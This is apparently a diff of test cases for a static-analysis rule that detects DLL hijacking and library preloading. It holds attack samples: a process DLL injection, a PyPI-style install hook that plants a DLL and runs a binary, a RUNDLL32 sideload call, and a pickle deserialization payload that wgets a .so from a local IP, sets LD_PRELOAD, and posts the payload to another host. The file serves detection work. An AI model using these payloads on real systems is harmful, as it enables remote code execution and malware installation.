@@ -1,4 +1,6 @@
 """Injecting a DLL into a process"""
+
+
 def f():
     import sys
 
@@ -63,12 +65,21 @@ def f():
     )
     print("[+] Successful injection into PID: %s" % PID)
 
+
 """OK: Injecting a DLL into a process"""
+
+
 def f():
     # ok: dll-hijacking
-    x="This is a string containing CreateRemoteThread"
+    x = "This is a string containing CreateRemoteThread"
 
-"""Phantom DLL case planting a DLL and executing a builtin binary"""
+
+"""
+Phantom DLL case planting a DLL and executing a builtin binary
+ref: https://www.reversinglabs.com/blog/attackers-leverage-pypi-to-sideload-malicious-dlls
+"""
+
+
 def f():
     class ActionOnInstall(install):
         def run(self):
@@ -99,36 +110,56 @@ def f():
                 f.write(rd)
             os.system("START " + dname + "\\ComServer.exe showdeskband")
 
+
 """OK: Injecting a DLL into a process"""
+
+
 def f():
     import os
+
     # ok: dll-hijacking
     os.system("start explorer.exe c:\\")
 
-"""Known executable sideloading dll"""
+
+"""
+Known executable sideloading dll
+ref: https://blogs.jpcert.or.jp/en/2024/02/lazarus_pypi.html
+"""
+
+
 def f():
     import os
+
     # ruleid: dll-hijacking
-    os.system("RUNDLL32.EXE" + " some.dll, function")
+    os.system("RUNDLL32.EXE " + "some.dll, function")
+
 
 """Preloading libraries in linux """
+
+
 def f():
     import os
     import pickle
     from base64 import b64encode
+
     import requests
 
     class Exploit(object):
         def __reduce__(self):
             # ruleid: dll-hijacking
-            return eval, ('__import__("os").system("wget http://10.0.0.2/.so -O /tmp/.so") & __import__("os").environ.__setitem__("LD_PRELOAD", "/tmp/.so")')
+            return eval, (
+                '__import__("os").system("wget http://10.0.0.2/.so -O /tmp/.so") & __import__("os").environ.__setitem__("LD_PRELOAD", "/tmp/.so")'
+            )
 
     requests.post(
         "http://10.0.0.3:5000/",
         cookies={"pickle": b64encode(pickle.dumps(Exploit())).decode()},
     )
 
+
 """OK: Preloading libraries in linux"""
+
+
 def f():
     # ok: dll-hijacking
     # This is comment that mentions LD_PRELOAD
